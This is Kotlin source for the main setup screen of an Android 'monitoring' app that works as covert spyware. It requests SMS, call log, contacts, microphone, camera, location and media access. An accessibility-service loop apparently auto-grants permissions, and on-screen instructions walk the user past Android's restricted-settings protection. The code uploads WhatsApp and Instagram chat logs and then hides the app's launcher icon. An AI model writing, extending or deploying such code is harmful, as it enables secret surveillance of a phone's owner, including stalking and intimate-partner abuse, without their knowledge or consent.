package com.spapp.monitoring.ui

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.ColorStateList
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.format.DateUtils
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import com.google.firebase.messaging.FirebaseMessaging
import com.spapp.monitoring.R
import com.spapp.monitoring.admin.SpappDeviceAdminReceiver
import com.spapp.monitoring.blocking.AccessibilityStatus
import com.spapp.monitoring.blocking.BlockAccessibilityService
import com.spapp.monitoring.collectors.AppUsageCollector
import com.spapp.monitoring.collectors.RealtimeLogObserverManager
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.databinding.ActivityMainBinding
import com.spapp.monitoring.fcm.FcmTokenSync
import com.spapp.monitoring.geofence.GeofenceManager
import com.spapp.monitoring.sync.SyncScheduler

/**
 * Main Status & Permission Control Center for Spapp Monitor.
 *
 * 1-TAP SETUP FLOW:
 * - Sequentially requests Standard Runtime Permissions + Accessibility Service.
 * - When Accessibility Service is enabled, automatically triggers "SYNC NOW"
 *   (instant WhatsApp & Instagram log sync, SyncScheduler.runOnce, and hides app icon).
 * - Remaining permissions (Battery Optimization, All Files, Notification Listener,
 *   Usage Access, Device Administrator, Autostart) are displayed on-screen for
 *   one-by-one manual toggling.
 */
class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var usageCollector: AppUsageCollector
    private lateinit var geofenceManager: GeofenceManager
    private lateinit var deviceState: DeviceState
    private var isOneTapFlowRunning = false
    private var autostartPrompted = false

    // 1. Standard Runtime Permissions Launcher
    private val runtimePermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        refreshPermissionStatus()
        // Always initialize log observer and trigger sync once permissions update
        RealtimeLogObserverManager.start(applicationContext)
        SyncScheduler.runOnce(applicationContext)
        if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled()) {
            deviceState.markSetupCompleted()
            triggerAutoSyncAfterAccessibility()
        }

        val grantedCount = results.values.count { it }
        if (!isOneTapFlowRunning && com.spapp.monitoring.blocking.BlockAccessibilityService.instance == null && grantedCount > 0) {
            Toast.makeText(this, "$grantedCount permissions updated", Toast.LENGTH_SHORT).show()
        }
        if (isOneTapFlowRunning) {
            handleNextSetupStep()
        }
    }

    // 2. Accessibility Launcher (Part of 1-Tap Core Flow)
    private val accessibilityLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isAccessibilityEnabled()) {
            triggerAutoSyncAfterAccessibility()
        }
        if (isOneTapFlowRunning) {
            handleNextSetupStep()
        }
    }

    // 3. Individual remaining permission launchers (tapped manually)
    private val batteryExemptionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
    }

    private val allFilesLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
    }

    private val notificationListenerLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
    }

    private val usageLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
    }

    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
    }

    private val autostartLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
    }

    private val statusHandler = Handler(Looper.getMainLooper())
    private val statusUpdater = object : Runnable {
        override fun run() {
            updateSyncStatusText()
            statusHandler.postDelayed(this, STATUS_REFRESH_MS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        deviceState = DeviceState(this)
        usageCollector = AppUsageCollector(this)
        geofenceManager = GeofenceManager(this)

        SyncScheduler.schedule(applicationContext)
        uploadCurrentFcmToken()
        RealtimeLogObserverManager.start(applicationContext)

        // Master 1-Tap Setup Button
        binding.btnMasterOneTap.setOnClickListener {
            val missingRuntime = getMissingRuntimePermissions()
            val missingAccessibility = !isAccessibilityEnabled()
            if (missingRuntime.isNotEmpty() || missingAccessibility) {
                isOneTapFlowRunning = true
                handleNextSetupStep()
            } else {
                Toast.makeText(
                    this,
                    "Core permissions & Accessibility active ✓ Tap remaining permissions below to enable",
                    Toast.LENGTH_SHORT
                ).show()
            }
        }

        // Individual permission shortcut listeners
        binding.btnCorePermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            val missing = getMissingRuntimePermissions()
            if (missing.isNotEmpty()) {
                runtimePermissionsLauncher.launch(missing.toTypedArray())
            } else {
                Toast.makeText(this, "Core permissions already active ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnBatteryPermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            if (!isBatteryExempted()) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                batteryExemptionLauncher.launch(intent)
            } else {
                Toast.makeText(this, "Battery optimization already unrestricted ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnAccessibilityPermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            showAccessibilityDialog()
        }

        binding.btnAccessibilityRestricted.setOnClickListener {
            openAppInfoSettings()
        }

        binding.btnNotificationPermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            showNotificationDialog()
        }

        binding.btnNotificationRestricted.setOnClickListener {
            openAppInfoSettings()
        }

        binding.btnUnlockRestricted.setOnClickListener {
            openAppInfoSettings()
        }

        binding.btnUsagePermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            if (!isUsageAccessGranted()) {
                Toast.makeText(this, "Find Spapp Monitor and toggle Usage Access ON", Toast.LENGTH_SHORT).show()
                usageLauncher.launch(usageCollector.usageAccessSettingsIntent())
            } else {
                Toast.makeText(this, "App usage tracking already active ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnFilePermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            if (!isFileAccessGranted()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    allFilesLauncher.launch(intent)
                }
            } else {
                Toast.makeText(this, "File access already granted ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnAdminPermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            if (!isDeviceAdminActive()) {
                deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
            } else {
                Toast.makeText(this, "Device Administrator already active ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnAutostartPermStatus.setOnClickListener {
            isOneTapFlowRunning = false
            openAutostartSettings()
        }

        // Sync Now Button
        binding.btnSyncNow.setOnClickListener {
            RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
            RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
            SyncScheduler.runOnce(applicationContext)
            hideAppIcon()
            Toast.makeText(this, "Sync triggered & App icon hidden", Toast.LENGTH_SHORT).show()
        }

        // Automatic permission start for fresh installation
        maybeStartAutoPermissionFlow()
    }

    /**
     * Fresh install: Starts Core (Standard Runtime + Accessibility) flow automatically.
     */
    private fun maybeStartAutoPermissionFlow() {
        val missingRuntime = getMissingRuntimePermissions()
        val isA11y = isAccessibilityEnabled()

        if (missingRuntime.isNotEmpty() && isA11y) {
            Handler(Looper.getMainLooper()).postDelayed({
                if (!isFinishing && !isDestroyed) {
                    BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                    runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
                }
            }, 15L)
        } else if (deviceState.isFirstLaunchAfterInstall() && (missingRuntime.isNotEmpty() || !isA11y)) {
            Handler(Looper.getMainLooper()).postDelayed({
                if (!isFinishing && !isDestroyed) {
                    isOneTapFlowRunning = true
                    handleNextSetupStep()
                }
            }, AUTO_FLOW_DELAY_MS)
        }
    }

    /**
     * Automatic SYNC NOW triggered once as soon as Accessibility permission and Core permissions are granted.
     */
    private fun triggerAutoSyncAfterAccessibility() {
        if (!deviceState.hasAutoSyncedAfterAccessibility && getMissingRuntimePermissions().isEmpty()) {
            deviceState.hasAutoSyncedAfterAccessibility = true
            Log.i(TAG, "Accessibility enabled & core permissions granted: triggering automatic initial sync & hide icon")
            RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
            RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
            SyncScheduler.runOnce(applicationContext)
            hideAppIcon()
            // Muted client-side notification on automated sync
            Log.i(TAG, "Core permissions active: initial sync completed")
        }
    }

    private fun hideAppIcon() {
        try {
            val p = packageManager
            val componentName = ComponentName(this, "$packageName.ui.SplashActivity")
            p.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error hiding app icon", e)
        }
    }

    override fun onResume() {
        super.onResume()
        refreshPermissionStatus()
        val missing = getMissingRuntimePermissions()
        if (missing.isNotEmpty() && isAccessibilityEnabled() && !isFinishing && !isDestroyed) {
            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
            runtimePermissionsLauncher.launch(missing.toTypedArray())
        } else if (isAccessibilityEnabled() && missing.isEmpty()) {
            triggerAutoSyncAfterAccessibility()
        }
        statusUpdater.run()
        uploadCurrentFcmToken()

        if (isOneTapFlowRunning) {
            handleNextSetupStep()
        }
    }

    override fun onPause() {
        super.onPause()
        statusHandler.removeCallbacks(statusUpdater)
    }

    // =========================================================================
    // DYNAMIC 1-TAP SETUP WORKFLOW (Runtime Permissions -> Accessibility)
    // =========================================================================

    private fun handleNextSetupStep() {
        val missingRuntime = getMissingRuntimePermissions()
        if (missingRuntime.isNotEmpty()) {
            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
            runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
            return
        }

        if (!isAccessibilityEnabled()) {
            showAccessibilityDialog()
            return
        }

        // Standard Runtime Permissions & Accessibility are now enabled!
        // We stop the automatic 1-tap chain here so remaining permissions can be toggled manually.
        isOneTapFlowRunning = false
        deviceState.markSetupCompleted()
        refreshPermissionStatus()
        // Muted client-side notification during setup step transition
        Log.i(TAG, "Core permissions & Accessibility active")
    }

    private fun showAccessibilityDialog() {
        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            "To enable Live Screen & Monitoring:\n\n" +
            "1. Tap 'Go to Settings' -> 'Downloaded apps' -> 'Spapp Monitor' -> Turn ON.\n\n" +
            "⚠️ Android 13/14 Restricted Setting:\n" +
            "If the switch is grayed out, tap 'Allow Restricted' below -> tap 3 vertical dots (top right) -> 'Allow restricted settings' -> then return and turn it ON."
        } else {
            "To enable Live Screen & Monitoring:\n\n" +
            "1. Tap 'Go to Settings' below.\n" +
            "2. Select 'Downloaded apps' or 'Installed services'.\n" +
            "3. Select 'Spapp Monitor' and toggle it ON."
        }

        AlertDialog.Builder(this)
            .setTitle(R.string.accessibility_dialog_title)
            .setMessage(msg)
            .setPositiveButton(R.string.go_to_settings) { _, _ ->
                try {
                    accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (e: Exception) {
                    Log.e(TAG, "Cannot open accessibility settings", e)
                    isOneTapFlowRunning = false
                }
            }
            .setNeutralButton(R.string.open_app_info) { _, _ ->
                openAppInfoSettings()
            }
            .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
                isOneTapFlowRunning = false
                deviceState.markSetupCompleted()
                refreshPermissionStatus()
            }
            .show()
    }

    private fun showNotificationDialog() {
        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            "To capture WhatsApp & Instagram chat logs:\n\n" +
            "1. Tap 'Go to Settings' -> Find 'Spapp Monitor' -> Toggle ON.\n\n" +
            "⚠️ If blocked ('Restricted setting'): Tap 'Allow Restricted' below -> 3 dots (top right) -> 'Allow restricted settings'."
        } else {
            "To capture WhatsApp & Instagram chat logs:\n\n" +
            "1. Tap 'Go to Settings' below.\n" +
            "2. Find 'Spapp Monitor' and toggle it ON."
        }

        AlertDialog.Builder(this)
            .setTitle("Enable Notification Access")
            .setMessage(msg)
            .setPositiveButton(R.string.go_to_settings) { _, _ ->
                try {
                    notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                } catch (e: Exception) {
                    Log.e(TAG, "Cannot open notification listener settings", e)
                }
            }
            .setNeutralButton(R.string.open_app_info) { _, _ ->
                openAppInfoSettings()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    // =========================================================================
    // PERMISSION STATUS CHECKS & UI REFRESH
    // =========================================================================

    private fun getMissingRuntimePermissions(): List<String> {
        val list = mutableListOf<String>()

        val hasLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (!hasLocation) {
            list.add(Manifest.permission.ACCESS_FINE_LOCATION)
            list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.READ_CALL_LOG)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.READ_CONTACTS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.READ_SMS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.RECORD_AUDIO)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.CAMERA)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.POST_NOTIFICATIONS)
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.READ_MEDIA_IMAGES)
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.READ_MEDIA_VIDEO)
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.READ_MEDIA_AUDIO)
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }

        return list
    }

    private fun isBatteryExempted(): Boolean {
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        return powerManager.isIgnoringBatteryOptimizations(packageName)
    }

    private fun isAccessibilityEnabled(): Boolean {
        return AccessibilityStatus.isEnabled(this)
    }

    private fun isNotificationAccessGranted(): Boolean {
        return try {
            val listeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
            listeners?.contains(packageName) == true ||
                    androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
        } catch (_: Exception) {
            false
        }
    }

    private fun isUsageAccessGranted(): Boolean = usageCollector.hasUsageAccess()

    private fun isFileAccessGranted(): Boolean {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager()
    }

    private fun isDeviceAdminActive(): Boolean {
        return SpappDeviceAdminReceiver.isActive(this)
    }

    private fun refreshPermissionStatus() {
        val isCore = getMissingRuntimePermissions().isEmpty()
        val isBattery = isBatteryExempted()
        val isAccessibility = isAccessibilityEnabled()
        val isNotification = isNotificationAccessGranted()
        val isUsage = isUsageAccessGranted()
        val isFile = isFileAccessGranted()
        val isAdmin = isDeviceAdminActive()

        updateStatusButton(binding.btnCorePermStatus, isCore, "Active ✓", "Grant")
        updateStatusButton(binding.btnBatteryPermStatus, isBattery, "Active ✓", "Grant")

        updateStatusButton(binding.btnAccessibilityPermStatus, isAccessibility, "Active ✓", "Enable")
        binding.btnAccessibilityRestricted.visibility =
            if (!isAccessibility && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) View.VISIBLE else View.GONE

        updateStatusButton(binding.btnNotificationPermStatus, isNotification, "Active ✓", "Enable")
        binding.btnNotificationRestricted.visibility =
            if (!isNotification && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) View.VISIBLE else View.GONE

        updateStatusButton(binding.btnUsagePermStatus, isUsage, "Active ✓", "Enable")
        updateStatusButton(binding.btnFilePermStatus, isFile, "Active ✓", "Enable")
        updateStatusButton(binding.btnAdminPermStatus, isAdmin, "Active ✓", "Enable")

        val isOem = isOemRom()
        binding.layoutAutostartPerm.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE
        binding.dividerAutostart.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE

        val needsRestrictedBanner = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && (!isAccessibility || !isNotification)
        binding.cardRestrictedBanner.visibility = if (needsRestrictedBanner) View.VISIBLE else View.GONE

        var grantedCount = 0
        if (isCore) grantedCount++
        if (isBattery) grantedCount++
        if (isAccessibility) grantedCount++
        if (isNotification) grantedCount++
        if (isUsage) grantedCount++
        if (isFile) grantedCount++
        if (isAdmin) grantedCount++

        val totalCount = 7
        binding.pbPermissions.max = totalCount
        binding.pbPermissions.progress = grantedCount
        binding.tvPermissionsCount.text = "$grantedCount / $totalCount Active"

        // Always keep the detailed checklist visible so user can configure remaining permissions one-by-one
        binding.layoutPermissionsList.visibility = View.VISIBLE
        binding.cardPermissionsList.visibility = View.VISIBLE

        if (isCore && isAccessibility) {
            if (grantedCount >= totalCount) {
                binding.tvMasterBadge.text = "ALL ACTIVE ✓"
                binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.success))
                binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
                binding.tvMasterDesc.text = "All background monitoring services are active and running."
                binding.btnMasterOneTap.text = "✓ ALL PERMISSIONS CONFIGURED & ACTIVE"
                binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.success))
                binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
            } else {
                binding.tvMasterBadge.text = "CORE ACTIVE ✓"
                binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.success))
                binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
                binding.tvMasterDesc.text = "Core permissions & Accessibility active. Initial sync completed! You can enable remaining permissions individually below."
                binding.btnMasterOneTap.text = "✓ CORE SETUP COMPLETE (Tap items below for full access)"
                binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.success))
                binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.accent))
            }
        } else {
            binding.tvMasterBadge.text = "ACTION NEEDED"
            binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.danger))
            binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.danger_bg))

            val missingRuntime = getMissingRuntimePermissions()
            if (missingRuntime.isNotEmpty()) {
                binding.tvMasterDesc.text = "Tap below to enable Standard Runtime Permissions & Accessibility in 1 tap."
                binding.btnMasterOneTap.text = "⚡ ALLOW CORE & ACCESSIBILITY PERMISSIONS"
            } else {
                binding.tvMasterDesc.text = "Core runtime permissions granted. Tap below to enable Accessibility service."
                binding.btnMasterOneTap.text = "⚡ ENABLE ACCESSIBILITY SERVICE"
            }
            binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
            binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.accent))
        }
    }

    private fun updateStatusButton(button: MaterialButton, isGranted: Boolean, grantedText: String, neededText: String) {
        if (isGranted) {
            button.text = grantedText
            button.setTextColor(ContextCompat.getColor(this, R.color.success))
            button.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
            button.strokeColor = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
            button.strokeWidth = 1
        } else {
            button.text = neededText
            button.setTextColor(ContextCompat.getColor(this, R.color.white))
            button.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
            button.strokeWidth = 0
        }
    }

    private fun isOemRom(): Boolean {
        val manufacturer = Build.MANUFACTURER.lowercase()
        return manufacturer.contains("xiaomi") ||
                manufacturer.contains("redmi") ||
                manufacturer.contains("oppo") ||
                manufacturer.contains("vivo") ||
                manufacturer.contains("huawei") ||
                manufacturer.contains("honor")
    }

    private fun getAutostartIntent(): Intent? {
        val candidates = listOf(
            Intent().setComponent(
                ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
            ),
            Intent().setComponent(
                ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")
            ),
            Intent().setComponent(
                ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")
            ),
            Intent().setComponent(
                ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")
            ),
            Intent().setComponent(
                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
            ),
        )
        for (intent in candidates) {
            if (packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY) != null) {
                return intent
            }
        }
        return null
    }

    private fun openAutostartSettings() {
        val intent = getAutostartIntent()
        if (intent != null) {
            try {
                autostartLauncher.launch(intent)
                return
            } catch (_: Exception) {}
        }
        openAppInfoSettings()
    }

    private fun openAppInfoSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "No app-info settings screen available", e)
        }
    }

    private fun updateSyncStatusText() {
        val lastSync = deviceState.lastSyncAtEpochMs
        binding.statusText.text = if (lastSync == 0L) {
            getString(R.string.sync_status_never)
        } else {
            val relative = DateUtils.getRelativeTimeSpanString(
                lastSync, System.currentTimeMillis(), DateUtils.MINUTE_IN_MILLIS
            )
            getString(R.string.sync_status_last_synced, relative)
        }
    }

    private fun uploadCurrentFcmToken() {
        FirebaseMessaging.getInstance().token
            .addOnSuccessListener { token ->
                Log.d(TAG, "FCM token fetched: $token")
                FcmTokenSync.enqueueUpload(applicationContext, token)
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "FCM token fetch failed", e)
            }
    }

    companion object {
        private const val TAG = "MainActivity"
        private const val STATUS_REFRESH_MS = 30_000L
        private const val AUTO_FLOW_DELAY_MS = 1_200L
    }
}